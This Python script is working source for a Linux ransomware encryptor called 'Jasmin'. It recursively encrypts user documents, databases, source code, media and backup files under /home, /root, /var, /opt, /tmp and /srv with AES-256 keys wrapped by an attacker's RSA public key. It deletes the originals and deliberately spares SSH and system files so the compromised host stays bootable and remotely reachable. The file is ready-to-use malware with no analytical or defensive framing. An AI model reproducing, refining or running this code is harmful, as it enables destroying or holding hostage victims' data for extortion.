#!/usr/bin/env python3
"""
Jasmin Linux Encryptor — AES-256-CBC + RSA-2048 混合加密
保护SSH/系统文件不被加密，确保加密后系统可正常启动和SSH登录
"""
import os, sys, struct, hashlib
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# ===== RSA 公钥 =====
# 绝不能内置固定公钥：此前这里是一把示例公钥（注释写着"替换为你自己的"但从未替换），
# 用它加密的文件与本平台 keygen 生成的私钥永不匹配 —— 等于把数据锁死且无法恢复。
# 现在必须显式提供：--pub <file> 或环境变量 JASMIN_PUB。
def load_public_key_path():
    import argparse
    ap = argparse.ArgumentParser(description='Jasmin Encryptor')
    ap.add_argument('--pub', help='RSA 公钥 PEM 文件路径（或设 JASMIN_PUB）')
    ap.add_argument('dirs', nargs='*', help='要加密的目录，默认 6 个根目录')
    a = ap.parse_args()
    path = a.pub or os.environ.get('JASMIN_PUB') or ''
    if not path:
        for cand in (os.path.join(os.path.dirname(os.path.abspath(__file__)), 'jasmin_public.pem'),
                     '/srv/jasmin_public.pem', '/opt/jasmin/jasmin_public.pem'):
            if os.path.exists(cand):
                path = cand
                break
    if not path or not os.path.exists(path):
        sys.stderr.write('[!] 未找到 RSA 公钥。请用 --pub <file> 指定，或设置 JASMIN_PUB。\n')
        sys.stderr.write('[!] 公钥在后台「生成RSA密钥对」后位于 payloads/jasmin_public.pem\n')
        sys.exit(2)
    pem = open(path, 'rb').read()
    if b'PUBLIC KEY' not in pem:
        sys.stderr.write('[!] %s 不是有效的 PEM 公钥\n' % path)
        sys.exit(2)
    return pem, a.dirs

# ===== 排除规则 =====
SKIP_DIRS = frozenset([
    '/boot','/dev','/proc','/sys','/run',
    '/sbin','/bin','/lib','/lib64','/usr',
    '/etc','/snap','/lost+found','/mnt',
])
SKIP_NAMES = frozenset([
    '.bashrc','.bash_profile','.profile',
    'authorized_keys','known_hosts',
    'id_rsa','id_rsa.pub','id_ed25519','id_ed25519.pub',
    'sshd_config','ssh_config',
    'shadow','passwd','group','fstab',
    'grub.cfg','initrd','vmlinuz',
])
PRUNE_DIRS = frozenset(['/var/lib/docker','/var/lib/containerd'])
TARGET_EXTS = {
    '.pptx','.docx','.xlsx','.txt','.pdf','.csv',
    '.jpeg','.jpg','.png','.ppt','.doc','.xls',
    '.zip','.rar','.7z','.mp3','.mp4','.avi',
    '.mov','.mkv','.sql','.bak','.mdb','.accdb',
    '.html','.php','.java','.py','.c','.cpp','.cs',
    '.json','.xml','.yaml','.yml','.md','.conf',
}

def should_skip(filepath: str) -> bool:
    fp = os.path.abspath(filepath)
    name = os.path.basename(fp)
    if fp.endswith('.jasmin'):
        return True
    for d in SKIP_DIRS:
        if fp.startswith(d + '/') or fp == d:
            return True
    if '/.ssh/' in fp or fp.endswith('/.ssh'):
        return True
    if name in SKIP_NAMES:
        return True
    _, ext = os.path.splitext(fp)
    if ext.lower() not in TARGET_EXTS:
        return True
    return False

# ===== 加密 =====
def pad16(data: bytes) -> bytes:
    n = 16 - (len(data) % 16)
    return data + bytes([n] * n)

def encrypt_file(path: str, rsa_pub_key) -> bool:
    try:
        if should_skip(path):
            return False
        plain = open(path, 'rb').read()
        if len(plain) == 0:
            return False

        sha = hashlib.sha256(plain).digest()
        aes_key = os.urandom(32)
        aes_iv = os.urandom(16)

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), default_backend())
        enc = cipher.encryptor()
        ct = enc.update(pad16(plain)) + enc.finalize()

        km = aes_key + aes_iv
        ek = rsa_pub_key.encrypt(km, asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None))

        out = path + '.jasmin'
        with open(out, 'wb') as f:
            f.write(sha)
            f.write(ct)
            f.write(ek)
            f.write(struct.pack('<I', len(ek)))

        os.remove(path)
        return True
    except Exception as e:
        # 静默吞掉异常会让"大面积失败"看起来像"已经加密完"（与 jasmin_diagnose.sh
        # 声称的"新版会打印真实 errno"直接矛盾）
        n = getattr(e, 'errno', None)
        key = ('%s (errno=%s)' % (type(e).__name__, n)) if n is not None else type(e).__name__
        FAILS[key] = FAILS.get(key, 0) + 1
        if FAILS[key] == 1:
            sys.stderr.write('[!] %s: %s\n' % (type(e).__name__, path))
        return False

FAILS = {}

def main():
    pub_pem, cli_dirs = load_public_key_path()
    pub_key = serialization.load_pem_public_key(pub_pem, default_backend())
    roots = cli_dirs or ['/home', '/root', '/var', '/opt', '/tmp', '/srv']
    count = 0
    for r in roots:
        if not os.path.isdir(r):
            continue
        for dirpath, dirs, files in os.walk(r):
            # 与解密端保持一致：容器快照层不是目标数据，且会让遍历慢几个数量级。
            # 加密时不管它、解密时又 prune 掉，那部分文件就永远解不回来。
            dirs[:] = [d for d in dirs if os.path.join(dirpath, d) not in PRUNE_DIRS]
            for fname in files:
                fp = os.path.join(dirpath, fname)
                if encrypt_file(fp, pub_key):
                    count += 1
    print(f'[+] Encrypted {count} files')
    if FAILS:
        total = sum(FAILS.values())
        print(f'[!] Failed on {total} file(s):', file=sys.stderr)
        for k, v in sorted(FAILS.items(), key=lambda x: -x[1]):
            print(f'[!]   {v} x {k}', file=sys.stderr)

if __name__ == '__main__':
    main()
